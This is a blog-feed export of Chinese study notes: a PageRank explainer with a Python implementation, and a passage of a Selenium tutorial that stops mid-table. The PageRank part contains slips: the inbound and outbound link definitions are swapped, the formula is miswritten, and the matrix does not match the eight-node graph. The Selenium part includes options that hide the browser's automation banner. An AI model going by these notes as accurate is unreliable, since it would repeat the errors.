    <content><![CDATA[<h1 id="PAGERANK学习笔记"><a href="#PAGERANK学习笔记" class="headerlink" title="PAGERANK学习笔记"></a>PAGERANK学习笔记</h1><h2 id="一、PageRank简介"><a href="#一、PageRank简介" class="headerlink" title="一、PageRank简介"></a>一、PageRank简介</h2><p>​        PageRank(PR)是谷歌搜索用来在搜索引擎中对网站进行排名的算法，<strong>Sergey Brin and Lawrence Page</strong> 发布了一篇论文《<strong>The Anatomy of a Large-Scale Hypertextual Web Search Engine</strong>.》。其中提出PageRank算法，PageRank算法输出一个概率分布，用于表示随机点击链接的人到达任何特定页面的可能性。可以计算任何大小的文档集合的PageRank。PageRank 计算需要通过集合进行多次传递（称为“迭代”），以调整近似的 PageRank 值，以更贴近理论真实值。</p>
<p>​    在最初的google paper中介绍这个算法的等式是<br>$$<br>PR(A)=(1-d)+d(\frac{PR(T_1)}{C(T_1)}+…+\frac{T_n}{C(T_n)})<br>$$</p>
<blockquote>
<p>我们假设页面 A 具有页面 T1…Tn 指向它。参数 d 是一个阻尼系数，可以设置为 0 到 1 之间。我们通常将 d 设置为 0.85。此外，C（A）被定义为从页面A流出的链接数量。</p>
</blockquote>
<blockquote>
<p>PageRanks在网页上形成概率分布，因此所有网页的PageRanks的总和将为1。</p>
</blockquote>
<blockquote>
<p>PageRank可以被认为是用户行为的模型。假设有一个“随机冲浪者”，他随机获得一个网页并不断点击链接，从未点击“返回”，但最终感到无聊并从另一个随机页面开始。随机冲浪者访问页面的概率是其PageRank。而且，d阻尼因子是“随机冲浪者”在每个页面上感到无聊并请求另一个随机页面的概率。一个重要的变化是仅将阻尼因子 d 添加到单个页面或一组页面。这允许个性化，并且几乎不可能故意误导系统以获得更高的排名。</p>
</blockquote>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1690776602495.png" alt="img"></p>
<p>图1表示一个有向图，节点A,B,C,D,E,F,H,K表示八个网页，他们的 链接关系如图一箭头所指的方向</p>
<p>​    入链：从页面流出的链接</p>
<p>​    出链：从页面访问的链接（可以理解为referer)</p>
<p>​    在图1中，A的出链有两个，入链有一个，所以A的PR值是</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20230731000617948.png" alt="image-20230731000617948"></p>
<ul>
<li>如果一个页面被很多高质量（PR值高的）页面指向，则该页面可以具有很高的PageRank</li>
</ul>
<h2 id="二、PageRank在计算的过程时会出现几个问题"><a href="#二、PageRank在计算的过程时会出现几个问题" class="headerlink" title="二、PageRank在计算的过程时会出现几个问题"></a>二、PageRank在计算的过程时会出现几个问题</h2><p>•   等级泄露（Rank Leak) 网页只有入链，没有出链( H )  为了避免PR为0 需要赋值</p>
<p>•   等级沉没（Rank Sink） 网页只有出链没有入链  (F)为了避免PR为0 需要赋值</p>
<p>•   Spider Traps 网页和其他节点无链接，只有自己指向自己 (k)</p>
<h2 id="三、PageRank定义"><a href="#三、PageRank定义" class="headerlink" title="三、PageRank定义"></a>三、PageRank定义</h2><p>假定有N个节点，每个节点到任意一个节点几率相等，那么转移的几率是1/N</p>
<ul>
<li>一个网页的PR值=所有入链集合的加权PR之和</li>
</ul>
<blockquote>
<p>uri A为评估页面，B{referer1.referer2}是A入链的集合</p>
<p>PR(A)=d*(PR(referer1)/referer1的所有出链数量+PR(referer2)/referer2的所有出链数量+…)</p>
</blockquote>
<h2 id="四、PageRank随机浏览模型"><a href="#四、PageRank随机浏览模型" class="headerlink" title="四、PageRank随机浏览模型"></a>四、PageRank随机浏览模型</h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/wps3.png" alt="img"></p>
<p>使用迭代法计算Pagerank值【根据图1的范例】<br>$$<br>\begin{bmatrix}\mathrm{PR(A)}\ \mathrm{PR(B)}\ \mathrm{PR(C)}\ \mathrm{PR(}D\mathrm{)}\ \mathrm{PR(}E\mathrm{)}\ \mathrm{PR(}F\mathrm{)}\ \mathrm{PR(}H\mathrm{)}\ \mathrm{PR(K)}\end{bmatrix}=d\begin{bmatrix}0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0\ 0 &amp; 0 &amp; \frac{1}{2} &amp; \frac{1}{2} &amp; 0 &amp; 0 &amp; 0\ \frac{1}{2} &amp; \frac{1}{2} &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0\ \frac{1}{2} &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0\ \frac{1}{2} &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0\ 0 &amp; 0 &amp; \frac{1}{2} &amp; 0 &amp; 0 &amp; 0 &amp; 0\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1\end{bmatrix}\begin{bmatrix}\mathrm{PR(A)}\ \mathrm{PR(B)}\ \mathrm{PR(C)}\ \mathrm{PR(}D\mathrm{)}\ \mathrm{PR(}E\mathrm{)}\ \mathrm{PR(}F\mathrm{)}\ \mathrm{PR(}H\mathrm{)}\ \mathrm{PR(K)}\end{bmatrix}+(1-d)\begin{bmatrix}\frac18\ \frac18\ \frac18\ \frac18\ \frac18\ \frac18\ \frac18\ \frac18\end{bmatrix}<br>$$</p>
<blockquote>
<p>将所有节点转换成数字，在将所有入链转换成坐标来得到矩阵</p>
<p>每行为对应页面的入链  B页面有两个入链D,和E （D和E都有两个出链，那么如果访问关系是按照链接跳转，那么从D和E跳转到B的可能性质都为1/2</p>
</blockquote>
<h2 id="五、python完整代码"><a href="#五、python完整代码" class="headerlink" title="五、python完整代码"></a>五、python完整代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">p &#x3D; 0.85  # 引入浏览当前网页的概率为p,假设p&#x3D;0.85</span><br><span class="line"></span><br><span class="line">df &#x3D; pd.read_csv(&#39;file&#x2F;1.csv&#39;)</span><br><span class="line">edges &#x3D; [list(edge) for edge in zip(df[&#39;t1&#39;], df[&#39;t2&#39;])]</span><br><span class="line"></span><br><span class="line"># 根据边获取节点的集合</span><br><span class="line">nodes &#x3D; list(set(np.array(edges).flatten()))</span><br><span class="line"></span><br><span class="line">N &#x3D; len(nodes)</span><br><span class="line"># 将字符串，映射成阿拉伯数字</span><br><span class="line">dict_uri &#x3D; dict(enumerate(nodes))</span><br><span class="line">#将字典键值反转  同时获取空值的id</span><br><span class="line">node_to_num&#x3D;&#123;&#125;</span><br><span class="line">num_isnull&#x3D;-1</span><br><span class="line">for key, val in dict_uri.items():</span><br><span class="line">    node_to_num[val]&#x3D;key</span><br><span class="line">    if val&#x3D;&#x3D;&#39;Q&#39;:</span><br><span class="line">        num_isnull&#x3D;key</span><br><span class="line">for edge in edges:</span><br><span class="line">    edge[0] &#x3D; node_to_num[edge[0]]</span><br><span class="line">    edge[1] &#x3D; node_to_num[edge[1]]</span><br><span class="line"># 生成初步的矩阵</span><br><span class="line">a &#x3D; np.zeros([N, N])</span><br><span class="line">for edge in edges:</span><br><span class="line">    a[edge[1], edge[0]] &#x3D; 1</span><br><span class="line"></span><br><span class="line"># 入链，行a[i]里面的元素都是i的入链</span><br><span class="line">length &#x3D; a.shape[1]  # 网页数量</span><br><span class="line"># 构造转移矩阵</span><br><span class="line"># 出链，行a[i]里面的元素都是i的出链</span><br><span class="line">b &#x3D; np.transpose(a)  # b为a的转置矩阵</span><br><span class="line">m &#x3D; np.zeros((a.shape), dtype&#x3D;float)</span><br><span class="line">for i in range(a.shape[0]):</span><br><span class="line">    for j in range(a.shape[1]):</span><br><span class="line">        # 如果一个节点没有任何出链，Dead Ends</span><br><span class="line">        if b[j].sum() &#x3D;&#x3D; 0:</span><br><span class="line">            b[j] &#x3D; b[j] + np.array([1 &#x2F; length] * length)</span><br><span class="line">        m[i][j] &#x3D; a[i][j] &#x2F; (b[j].sum())  # 完成初始化分配</span><br><span class="line"></span><br><span class="line"># pr值得初始化</span><br><span class="line">v &#x3D; np.zeros((m.shape[0], 1), dtype&#x3D;float)  # 构造一个存放pr值得矩阵</span><br><span class="line">for i in range(m.shape[0]):</span><br><span class="line">    v[i] &#x3D; float(1) &#x2F; m.shape[0]</span><br><span class="line"></span><br><span class="line">count &#x3D; 0</span><br><span class="line">ee &#x3D; np.array([[1 &#x2F; length] * length]).reshape(length, -1)</span><br><span class="line"># 循环100次计算pageRank值</span><br><span class="line">for i in range(1000):</span><br><span class="line">    #  解决spider traps问题，spider traps会导致网站权重向一个节点偏移，将转移矩阵加上打开其他网页的概率1-p</span><br><span class="line">    v &#x3D; p * np.dot(m, v) + (1 - p) * ee</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line"># pageRank值</span><br><span class="line"></span><br><span class="line">t &#x3D; 0</span><br><span class="line">info &#x3D; dict()</span><br><span class="line">for i in v:</span><br><span class="line">    info[dict_uri[t]] &#x3D; list(i)[0]</span><br><span class="line">    # info.append(temp)</span><br><span class="line">    t +&#x3D; 1</span><br><span class="line">pagerank_sorted_values &#x3D; sorted(info.items(), key&#x3D;lambda x: x[1], reverse&#x3D;True)</span><br><span class="line">print(pagerank_sorted_values)</span><br><span class="line">all&#x3D;0</span><br><span class="line">for i in pagerank_sorted_values:</span><br><span class="line">    all+&#x3D;list(i)[1]</span><br><span class="line">print(all)</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><p>《<strong>The Anatomy of a Large-Scale Hypertextual Web Search Engine</strong>.》算法论文：<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/334.pdf">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/334.pdf</a></p>
</li>
<li><p>《人工智能自然语言处理—PageRank算法和TextRank算法详解》<a href="https://cloud.tencent.com/developer/article/2261595">https://cloud.tencent.com/developer/article/2261595</a></p>
</li>
<li><p>机器学习经典算法之PageRank <a href="https://www.cnblogs.com/jpcflyer/p/11180263.html">https://www.cnblogs.com/jpcflyer/p/11180263.html</a></p>
</li>
<li><p>PageRank 算法详解<a href="https://blog.csdn.net/qq_41427834/article/details/110262036">https://blog.csdn.net/qq_41427834/article/details/110262036</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>安全研究</category>
        <category>数据挖掘算法</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
      </tags>
  </entry>
  <entry>
    <title>selenium模块</title>
    <url>/selenium%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a><strong>一、简介</strong></h1><p>自动化测模块，通过驱动浏览器，模拟浏览器的操作，比如跳转、输入、点击、下拉等，来拿到网页渲染之后的结果，可支持多种浏览器。</p>
<h1 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a><strong>二、安装</strong></h1><h2 id="3-1、pip-安装"><a href="#3-1、pip-安装" class="headerlink" title="3.1、pip 安装"></a><strong>3.1、pip 安装</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure>

<h2 id="3-2、安装驱动"><a href="#3-2、安装驱动" class="headerlink" title="3.2、安装驱动"></a><strong>3.2、安装驱动</strong></h2><p>注：安装完记得配置环境变量~ [path]</p>
<ul>
<li><strong>Firefox浏览器驱动：geckodriver</strong>  </li>
</ul>
<p>​    <a href="https://github.com/mozilla/geckodriver/releases">https://github.com/mozilla/geckodriver/releases</a></p>
<ul>
<li><strong>Chrome浏览器驱动：</strong></li>
</ul>
<p>​    <a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a></p>
<ul>
<li><strong>IE浏览器驱动：IEDriverServer</strong></li>
</ul>
<p>​    <a href="http://selenium-release.storage.googleapis.com/index.html">http://selenium-release.storage.googleapis.com/index.html</a></p>
<ul>
<li><strong>Edge浏览器驱动：MicrosoftWebDriver</strong></li>
</ul>
<p>​    <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/">https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/</a></p>
<ul>
<li><strong>Opera浏览器驱动：operadriver</strong></li>
</ul>
<p><a href="https://github.com/operasoftware/operachromiumdriver/releases">https://github.com/operasoftware/operachromiumdriver/releases</a></p>
<ul>
<li><strong>PhantomJS浏览器驱动：phantomjs</strong></li>
</ul>
<p><a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a></p>
<h1 id="三、基本使用"><a href="#三、基本使用" class="headerlink" title="三、基本使用"></a><strong>三、</strong>基本使用</h1><h2 id="3-1、Options-）"><a href="#3-1、Options-）" class="headerlink" title="3.1、Options(）"></a><strong>3.1、Options(）</strong></h2><p>Chrome Options是一个配置chrome启动时属性的类，通过这个参数我们可以为Chrome添加如下参数：</p>
<p><strong>1、基本参数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver option &#x3D; webdriver.ChromeOptions()</span><br><span class="line"># 禁用显卡 </span><br><span class="line">option.add_argument(&#39;--disable-gpu&#39;) </span><br><span class="line"># 替换UA</span><br><span class="line">option.add_argument(&quot;--user-agent&#x3D;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;67.0.3396.99 Safari&#x2F;537.36&quot;)  </span><br><span class="line">#指定浏览器分辨率 </span><br><span class="line">option.add_argument(&#39;window-size&#x3D;1920x3000&#39;) </span><br><span class="line">#谷歌文档提到需要加上这个属性来规避bug </span><br><span class="line">option.add_argument(&#39;--disable-gpu&#39;) </span><br><span class="line">#隐藏滚动条, 应对一些特殊页面 </span><br><span class="line">option.add_argument(&#39;--hide-scrollbars&#39;) </span><br><span class="line">#不加载图片, 提升速度</span><br><span class="line">option.add_argument(&#39;blink-settings&#x3D;imagesEnabled&#x3D;false&#39;) </span><br><span class="line">#设置语言</span><br><span class="line">options.add_argument(&#39;lang&#x3D;zh_CN.UTF-8&#39;)  </span><br><span class="line"># 禁止策略化</span><br><span class="line">options.add_argument(&#39;--disable-infobars&#39;)  </span><br><span class="line"># 解决DevToolsActivePort文件不存在的报错</span><br><span class="line">options.add_argument(&#39;--no-sandbox&#39;)</span><br><span class="line"># 指定浏览器分辨率 </span><br><span class="line">options.add_argument(&#39;window-size&#x3D;1920x3000&#39;)  </span><br><span class="line"># 隐身模式（无痕模式）</span><br><span class="line">bug options.add_argument(&#39;--incognito&#39;)   </span><br><span class="line"># 禁用javascript</span><br><span class="line">options.add_argument(&#39;--disable-javascript&#39;)   </span><br><span class="line"># 最大化运行（全屏窗口）,不设置，取元素会报错</span><br><span class="line">options.add_argument(&#39;--start-maximized&#39;)   </span><br><span class="line"># 禁用浏览器正在被自动化程序控制的提示</span><br><span class="line">options.add_argument(&#39;--disable-infobars&#39;)   </span><br><span class="line"># 隐藏滚动条, 应对一些特殊页面 </span><br><span class="line">options.add_argument(&#39;--hide-scrollbars&#39;)  </span><br><span class="line"># 开启无界面模式. linux下如果系统不支持可视化不加这条会启动失败 </span><br><span class="line">options.add_argument(&#39;--headless&#39;)  </span><br><span class="line">#开发者模式</span><br><span class="line">options.add_experimental_option(&#39;excludeSwitches&#39;, [&#39;enable-automation&#39;])   </span><br><span class="line"># 屏蔽&#39;保存密码&#39;提示框 </span><br><span class="line">options.add_experimental_option(&quot;prefs&quot;, prefs) </span><br><span class="line"># 手动指定使用的浏览器位置</span><br><span class="line">options.binary_location &#x3D; r&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot;  </span><br><span class="line">driver &#x3D; webdriver.Chrome(chrome_options &#x3D; options) driver.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#39;)</span><br></pre></td></tr></table></figure>



<p><strong>2、设置代理</strong></p>
<p>方法1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip_info&#x3D;&quot;182.14.2.3:29&quot; options.add_argument(&quot;--proxy-server&#x3D;http:&#x2F;&#x2F;&#123;&#125;&quot;.format(ip_info))   #设置代理</span><br></pre></td></tr></table></figure>



<p>方法2：</p>
<p>更新代理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxy &#x3D; Proxy(</span><br><span class="line">    &#123;</span><br><span class="line">        &#39;proxyType&#39;: ProxyType.MANUAL,</span><br><span class="line">        &#39;httpProxy&#39;: &#39;&#123;&#125;&#39;.format(ip_info)  # 代理ip和端口</span><br><span class="line">        #&#39;httpProxy&#39;: &#39;&#123;&#125;&#39;.format(&quot;11.2.2.22:8080&quot;)  # 代理ip和端口</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">desired_capabilities &#x3D; webdriver.DesiredCapabilities.CHROME.copy()</span><br><span class="line">proxy.add_to_capabilities(desired_capabilities)</span><br><span class="line">driver.start_session(desired_capabilities)</span><br></pre></td></tr></table></figure>



<p><strong>3、关闭selenium关闭左上方Chrome 正受到自动测试软件的控制的提示</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">options.add_experimental_option(&#39;useAutomationExtension&#39;, False) options.add_experimental_option(&quot;excludeSwitches&quot;, [&#39;enable-automation&#39;])</span><br></pre></td></tr></table></figure>



<h2 id="3-2、打开一个测试窗口"><a href="#3-2、打开一个测试窗口" class="headerlink" title="3.2、打开一个测试窗口"></a><strong>3.2、打开一个测试窗口</strong></h2><p><strong>1.通过谷歌浏览器驱动，打开谷歌浏览器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 打开浏览器方式一</span><br><span class="line">driver &#x3D; webdriver.Chrome(executable_path&#x3D;r&#39;C:\Users\Administrator\Desktop\chromedriver.exe&#39;)</span><br><span class="line"></span><br><span class="line"># 打开浏览器方式二  推荐  []需要配置环境变量]</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line"></span><br><span class="line">browser.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#39;)</span><br><span class="line">input &#x3D; browser.find_element_by_id(&#39;kw&#39;)#找到搜索框 ，根据id找</span><br><span class="line">input.send_keys(&#39;iPhone&#39;)#传送入关键词</span><br><span class="line"># time.sleep(5)  </span><br><span class="line"># input.clear()#清空搜索框</span><br><span class="line"># input.send_keys(&#39;1111&#39;)  #输入1111</span><br><span class="line">button &#x3D; browser.find_element_by_id(&#39;su&#39;)#找到搜索按钮</span><br><span class="line">button.click()  #点击</span><br></pre></td></tr></table></figure>



<h2 id="3-3、关闭测试窗口"><a href="#3-3、关闭测试窗口" class="headerlink" title="3.3、关闭测试窗口"></a><strong>3.3、关闭测试窗口</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driver.close() #关闭单个窗口   #linux可能出现问题 </span><br><span class="line">driver.quit() #关闭所有窗口</span><br></pre></td></tr></table></figure>



<h2 id="3-4、获取部分信息"><a href="#3-4、获取部分信息" class="headerlink" title="3.4、获取部分信息"></a><strong>3.4、获取部分信息</strong></h2><p><strong>1、获取url</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">h&#x3D;driver.get(url)</span><br></pre></td></tr></table></figure>

<p><strong>2、获取cookie</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cookie&#x3D;dervr.get_cookie()</span><br></pre></td></tr></table></figure>

<p><strong>3、获取值</strong></p>
<ul>
<li>get_attribute()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x3D; browser.find_element_by_id(&#39;kw&#39;).get_attribute(&#39;href&#39;)</span><br></pre></td></tr></table></figure>



<ul>
<li>text</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x3D; browser.find_element_by_id(&#39;kw&#39;).text</span><br></pre></td></tr></table></figure>



<p><strong>4、tag_name来获取元素的标签信息</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x3D; browser.find_element_by_id(&#39;kw&#39;).tag_name</span><br></pre></td></tr></table></figure>



<h2 id="3-5、等待"><a href="#3-5、等待" class="headerlink" title="3.5、等待"></a><strong>3.5、等待</strong></h2><p>由于可能出现页面未加载，就执行其他代码的情况，因此，需要添加等待</p>
<p><strong>1、强制等待</strong></p>
<p>time.sleep()</p>
<p><strong>2、隐式等待</strong></p>
<p>隐式等待:在查找所有元素时，如果尚未被加载，则等10秒</p>
<p>隐式等待只需要设置一次，在设置时间内，页面加载就停止等待</p>
<p>超过时间，会报错</p>
<p>browser.implicitly_wait(10)</p>
<p><strong>3、显式等待</strong></p>
<p>等待一个元素加载处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium.webdriver.support import expected_conditions as EC</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">from selenium.webdriver.support.wait import WebDriverWait</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;https:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">WebDriverWait(driver, 5).until(EC.presence_of_all_elements_located((By.ID, &quot;kw&quot;)),message&#x3D;&#39;元素kw未出现&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>.判断当前页面的title是否精确等于预期</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.title_is(u&quot;百度一下，你就知道&quot;))</span><br></pre></td></tr></table></figure>



<ul>
<li>.判断当前页面的title是否包含预期字符串</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.title_contains(u&quot;百度一下&quot;))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断某个元素是否被加到了dom树里，并不代表该元素一定可见，通俗易懂点就是元素存不存在这个页面</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.presence_of_element_located((By.ID,&#39;kw&#39;)))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断是否至少有1个元素存在于dom树中，如果页面上有n个元素的class都是’column-md-3’，那么只要有1个元素存在，这个方法就返回True</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver, 5).until(EC.presence_of_all_elements_located((By.ID, &quot;kw&quot;)))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断某个元素是否可见.可见代表元素非隐藏，并且元素的宽和高都不等于0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.ID, ‘k’)))</p>
<ul>
<li>判断元素是否可见，如果可见就返回这个元素</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.visibility_of(driver.find_element(by&#x3D;By.ID,value&#x3D;&#39;kw&#39;)))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断某个元素是否被选中了,一般用在下拉列表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.element_to_be_selected(driver.find_element(By.XPATH,&quot;&#x2F;&#x2F;*[@id&#x3D;&#39;nr&#39;]&#x2F;option[1]&quot;)))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断页面上是否存在alert,如果有就切换到alert并返回alert的内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">instance &#x3D; WebDriverWait(driver,10).until(EC.alert_is_present())</span><br></pre></td></tr></table></figure>



<ul>
<li>判断该frame是否可以switch进去，如果可以的话，返回True并且switch进去，否则返回False</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.frame_to_be_available_and_switch_to_it(locator))</span><br></pre></td></tr></table></figure>



<h1 id="四、选择器"><a href="#四、选择器" class="headerlink" title="四、选择器"></a><strong>四、选择器</strong></h1><h2 id="4-1、定位元素常用八种方法"><a href="#4-1、定位元素常用八种方法" class="headerlink" title="4.1、定位元素常用八种方法"></a><strong>4.1、定位元素常用八种方法</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driver.find_element_by_id()  #通过元素id定位</span><br><span class="line">driver.find_element_by_name()  #通过元素name定位</span><br><span class="line">driver.find_element_by_xpath()  #通过xpath表达式定位</span><br><span class="line">driver.find_element_by_link_text()  #通过完整超链接定位</span><br><span class="line">driver.find_element_by_partial_link_text()  #通过部分链接定位</span><br><span class="line">driver.find_element_by_tag_name()  #通过标签定位</span><br><span class="line">driver.find_element_by_class_name()  #通过类名进行定位</span><br><span class="line">driver.find_element_by_css_selector()  #通过css选择器进行定位</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式1：By.ID</span><br><span class="line">driver.find_element_by_id()#通过ID属性定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_id()#通过ID属性定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_id()[3]#通过ID属性定位多个元素中的第3个</span><br><span class="line">此处需注意，python中列表索引从0开始，但驱动浏览器执行时，相关执行语言中索引是从1开始哦！</span><br><span class="line">方式2：By.NAME</span><br><span class="line">driver.find_element_by_name()#通过NAME属性定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_name()#通过NAME属性定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_name()[3]#通过NAME属性定位多个元素中的第3个</span><br><span class="line">方式3：By.CLASS_NAME</span><br><span class="line">driver.find_elements_by_class_name()#通过类名定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_class_name()#通过类名定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_class_name()[3]#通过类名定位多个元素中的第3个</span><br><span class="line">方式4：By.TAG_NAME</span><br><span class="line">driver.find_element_by_tag_name()#通过标签名定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_tag_name()#通过标签名定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_tag_name()[3]#通过标签名定位多个元素中的第3个</span><br><span class="line">方式5：By.LINK_TEXT</span><br><span class="line">driver.find_element_by_link_text()#通过超链接(a标签)的文本定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_link_text()#通过超链接(a标签)的文本定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_link_text()[3]#通过超链接(a标签)的文本定位多个元素中的第3个</span><br><span class="line">方式6：By.PARTIAL_LINK_TEXT</span><br><span class="line">driver.find_element_by_partial_link_text()#通过超链接(a标签)的部分文本定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_partial_link_text()#通过超链接(a标签)的部分文本定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_partial_link_text()[3]#通过超链接(a标签)的部分文本定位多个元素中的第3个</span><br><span class="line">方式7：By.CSS_SELECTOR(几乎万用，更切合前端CSS样式语言)</span><br><span class="line">driver.find_element_by_css_selector()#通过CSS选择器定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_css_selector()#通过CSS选择器定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_css_selector()[3]#通过CSS选择器定位多个元素中的第3个</span><br><span class="line">未完待续</span><br><span class="line">方式8：By.XPATH(几乎万用，更切合后端XML语言)</span><br><span class="line">driver.find_element_by_xpath() #通过XPATH定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_xpath() #通过XPATH定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_xpath() [3]#通过XPATH定位多个元素中的第3个</span><br></pre></td></tr></table></figure>

<h2 id="4-3、鼠标操作"><a href="#4-3、鼠标操作" class="headerlink" title="4.3、鼠标操作"></a><strong>4.3、鼠标操作</strong></h2><p><strong>1、基本操作</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perform()	执行ActionsChains类中存储的所以行为</span><br><span class="line">context_click()	右击</span><br><span class="line">double_click()	双击</span><br><span class="line">drag_and_drop()	拖动</span><br><span class="line">move_to_element()	鼠标悬停</span><br></pre></td></tr></table></figure>

<p><strong>2、拖拽</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium.webdriver.common.action_chains import ActionChains</span><br><span class="line">action_chains &#x3D; webdriver.ActionChains(driver)</span><br><span class="line">action_chains.drag_and_drop_by_offset(source, targetOffsetX - 2, 0).perform()</span><br></pre></td></tr></table></figure>

<h2 id="4-4、键盘操作"><a href="#4-4、键盘操作" class="headerlink" title="4.4、键盘操作"></a><strong>4.4、键盘操作</strong></h2><p>使用send_keys()方法时，需要先进行以下的导入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">#找到提交按钮</span><br><span class="line">buttion_search &#x3D; browser.find_element_by_class_name(&#39;s_search&#39;)   </span><br><span class="line">buttion_search.click()   #相当于点击按钮</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>方法</th>
<th>对应键盘操作</th>
</tr>
</thead>
<tbody><tr>
<td>send_keys(Keys.BACK_SPACE)</td>
<td>删除键（BackSpace）</td>
</tr>
<tr>
<td>send_keys(Keys.SPACE)</td>
<td>空格键（Space）</td>
</tr>
<tr>
<td>send_keys(Keys.TAB)</td>
<td>指标键</td>
</tr>
<tr>
<td>send_keys(Keys.ESCAPE)</td>
<td>回退键（）Esc</td>
</tr>
<tr>
